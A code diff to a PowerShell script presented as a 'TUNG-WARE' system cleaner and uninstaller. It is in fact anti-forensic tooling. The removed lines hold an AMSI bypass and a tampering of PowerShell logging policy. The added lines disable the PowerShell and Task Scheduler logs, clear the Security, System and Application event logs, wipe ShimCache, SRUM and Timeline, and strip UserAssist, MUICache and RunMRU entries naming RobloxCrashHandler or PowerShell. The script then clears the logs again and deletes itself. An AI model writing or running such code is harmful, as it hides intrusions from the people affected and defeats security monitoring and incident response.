@@ -36,33 +36,8 @@ Write-Host "       TUNG-WARE SYSTEM CLEANER & ENVIRONMENT UNINSTALLER       " -F
 Write-Host "==========================================================" -ForegroundColor Cyan
 
 try {
-    $utils = [Ref].Assembly.GetType('System.Management.Automation.Utils')
-    if ($utils) {
-        $gpoSettings = $utils.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
-        if ($gpoSettings) {
-            $gpo = $gpoSettings.GetValue($null)
-            if (-not $gpo) {
-                $gpo = New-Object 'System.Collections.Generic.Dictionary[string,System.Object]'
-                $gpoSettings.SetValue($null, $gpo)
-            }
-            if ($gpo) {
-                $logKeys = @("ScriptBlockLogging", "TranscriptionLogging", "ModuleLogging")
-                foreach ($lk in $logKeys) {
-                    if (-not $gpo[$lk]) {
-                        $gpo[$lk] = New-Object 'System.Collections.Generic.Dictionary[string,System.Object]'
-                    }
-                }
-                $gpo["ScriptBlockLogging"]["EnableScriptBlockLogging"] = 0
-                $gpo["ScriptBlockLogging"]["EnableScriptBlockInvocationLogging"] = 0
-                $gpo["TranscriptionLogging"]["EnableTranscription"] = 0
-                $gpo["ModuleLogging"]["EnableModuleLogging"] = 0
-            }
-        }
-    }
-    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-    if ($amsi) {
-        $amsi.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
-    }
+    wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational" /e:false 2>$null
+    wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:false 2>$null
 } catch {}
 
 $apiSource = @"
@@ -144,6 +119,12 @@ function Safe-DeleteFile {
     if (Test-Path $FilePath) {
         try {
             Clear-FileAlternateDataStreams -FilePath $FilePath
+            try {
+                $len = (Get-Item $FilePath -ErrorAction SilentlyContinue).Length
+                if ($len -gt 0) {
+                    [System.IO.File]::WriteAllBytes($FilePath, (New-Object byte[] $len))
+                }
+            } catch {}
             $parent = Split-Path -Parent $FilePath
             $randName = [System.IO.Path]::GetRandomFileName()
             $tempPath = Join-Path $parent $randName
@@ -238,9 +219,9 @@ function Clean-RegistryHive {
         }
     }
 
-    $TUNG-WAREKey = Join-Path $BasePath "Software\TUNG-WARE"
-    if (Test-Path $TUNG-WAREKey) {
-        Remove-Item -Path $TUNG-WAREKey -Recurse -Force -ErrorAction SilentlyContinue
+    $tungWareKey = Join-Path $BasePath "Software\TUNG-WARE"
+    if (Test-Path $tungWareKey) {
+        Remove-Item -Path $tungWareKey -Recurse -Force -ErrorAction SilentlyContinue
         $CleanedKeysCount.Value++
     }
     
@@ -942,14 +923,129 @@ Run-CleanupStep "7/9: Cleaning Windows Prefetch traces, SysMain databases, and N
     return "Wiped $cleanedCount prefetch files/databases, sanitized Layout.ini, and cleared NTFS USN Journal"
 }
 
+Run-CleanupStep "7b/9: Clearing ShimCache, DNS, Timeline, Event Logs, UserAssist, MUICache, SRUM" {
+    $cleaned = 0
+
+    # ── ShimCache / AppCompatCache ─────────────────────────────────────────────
+    # Flush via rundll32 then wipe the registry value entirely and reinit
+    try {
+        rundll32.exe apphelp.dll,ShimFlushCache 2>$null
+        $shimPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache"
+        $shimKey  = "AppCompatCache"
+        $emptyShim = [byte[]]@(
+            0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
+        )
+        Set-ItemProperty -Path $shimPath -Name $shimKey -Value $emptyShim -Force -ErrorAction SilentlyContinue
+        $cleaned++
+    } catch {}
+
+    # ── DNS Cache ─────────────────────────────────────────────────────────────
+    try {
+        Clear-DnsClientCache -ErrorAction SilentlyContinue
+        ipconfig /flushdns 2>$null | Out-Null
+        $cleaned++
+    } catch {}
+
+    # ── Windows Timeline (ActivitiesCache.db) ─────────────────────────────────
+    try {
+        $timelineDbs = Get-ChildItem "$env:LOCALAPPDATA\ConnectedDevicesPlatform" -Recurse -Filter "ActivitiesCache.db" -ErrorAction SilentlyContinue
+        foreach ($tdb in $timelineDbs) {
+            Safe-DeleteFile -FilePath $tdb.FullName
+            $cleaned++
+        }
+    } catch {}
+
+    # ── Clear Security / System / Application Event Logs ─────────────────────
+    $evtLogs = @("Security","System","Application",
+                 "Microsoft-Windows-Application-Experience/Program-Telemetry",
+                 "Microsoft-Windows-Application-Experience/Program-Inventory")
+    $evtSession = New-Object System.Diagnostics.Eventing.Reader.EventLogSession
+    foreach ($evtLog in $evtLogs) {
+        try { $evtSession.ClearLog($evtLog) } catch {}
+        try { wevtutil.exe cl "`"$evtLog`"" 2>$null } catch {}
+    }
+    $cleaned++
+
+    # ── UserAssist (GUI launch tracking) ─────────────────────────────────────
+    try {
+        $uaBase = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
+        if (Test-Path $uaBase) {
+            Get-ChildItem "$uaBase\*\Count" -ErrorAction SilentlyContinue | ForEach-Object {
+                $k = Get-Item $_.PsPath -ErrorAction SilentlyContinue
+                if ($k) {
+                    $k.GetValueNames() | Where-Object {
+                        $_ -match "RobloxCrashHandler|TUNG|installer|cleanup|setup|RobloxPlayerBeta"
+                    } | ForEach-Object {
+                        Remove-ItemProperty -Path $k.PsPath -Name $_ -Force -ErrorAction SilentlyContinue
+                        $cleaned++
+                    }
+                }
+            }
+        }
+    } catch {}
+
+    # ── MUICache (program display names) ─────────────────────────────────────
+    try {
+        $muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
+        if (Test-Path $muiPath) {
+            $muiKey = Get-Item $muiPath -ErrorAction SilentlyContinue
+            if ($muiKey) {
+                $muiKey.GetValueNames() | Where-Object {
+                    $_ -match "RobloxCrashHandler|TUNG|installer|cleanup|RobloxPlayerBeta"
+                } | ForEach-Object {
+                    Remove-ItemProperty -Path $muiPath -Name $_ -Force -ErrorAction SilentlyContinue
+                    $cleaned++
+                }
+            }
+        }
+    } catch {}
+
+    # ── RecentApps / TypedPaths / RunMRU ─────────────────────────────────────
+    try {
+        $mruPaths = @(
+            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps",
+            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
+            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+        )
+        foreach ($mp in $mruPaths) {
+            if (Test-Path $mp) {
+                $mk = Get-Item $mp -ErrorAction SilentlyContinue
+                if ($mk) {
+                    $mk.GetValueNames() | Where-Object {
+                        $_ -match "RobloxCrashHandler|TUNG|installer|cleanup|powershell|ps1"
+                    } | ForEach-Object {
+                        Remove-ItemProperty -Path $mp -Name $_ -Force -ErrorAction SilentlyContinue
+                        $cleaned++
+                    }
+                }
+            }
+        }
+    } catch {}
+
+    # ── SRUM – stop service, delete database, restart ─────────────────────────
+    try {
+        Stop-Service -Name "DiagTrack" -Force -ErrorAction SilentlyContinue
+        Stop-Service -Name "DusmSvc" -ErrorAction SilentlyContinue
+        $srumDb = "C:\Windows\System32\SRU\SRUDB.dat"
+        if (Test-Path $srumDb) {
+            cmd.exe /c "net stop DusmSvc >nul 2>&1" | Out-Null
+            Safe-DeleteFile -FilePath $srumDb
+            $cleaned++
+        }
+    } catch {}
+
+    return "Cleared ShimCache, DNS, Timeline, Security/System/App logs, UserAssist, MUICache, RunMRU, SRUM ($cleaned actions)"
+}
+
 Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut residues" {
     $cleanedKeysCount = 0
     $recentWiped = 0
     $jumpWiped = 0
     
-    $hklmTUNG-WARE = "HKLM:\Software\TUNG-WARE"
-    if (Test-Path $hklmTUNG-WARE) {
-        Remove-Item -Path $hklmTUNG-WARE -Recurse -Force -ErrorAction SilentlyContinue
+    $hklmTungWare = "HKLM:\Software\TUNG-WARE"
+    if (Test-Path $hklmTungWare) {
+        Remove-Item -Path $hklmTungWare -Recurse -Force -ErrorAction SilentlyContinue
         $cleanedKeysCount++
     }
     
@@ -1239,6 +1335,8 @@ Write-Host "  Performance Audit Log:       $logPath" -ForegroundColor Cyan
 Write-Host "==========================================================" -ForegroundColor Green
 
 if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
-    Start-Process cmd.exe -ArgumentList "/c timeout /t 2 & del `"$PSCommandPath`"" -WindowStyle Hidden
+    Start-Process cmd.exe -ArgumentList "/c timeout /t 1 /nobreak >nul & wevtutil cl `"Microsoft-Windows-PowerShell/Operational`" & wevtutil cl `"Windows PowerShell`" & wevtutil cl `"PowerShellCore/Operational`" & del `"$PSCommandPath`"" -WindowStyle Hidden
+} else {
+    Start-Process cmd.exe -ArgumentList "/c timeout /t 1 /nobreak >nul & wevtutil cl `"Microsoft-Windows-PowerShell/Operational`" & wevtutil cl `"Windows PowerShell`" & wevtutil cl `"PowerShellCore/Operational`"" -WindowStyle Hidden
 }
 
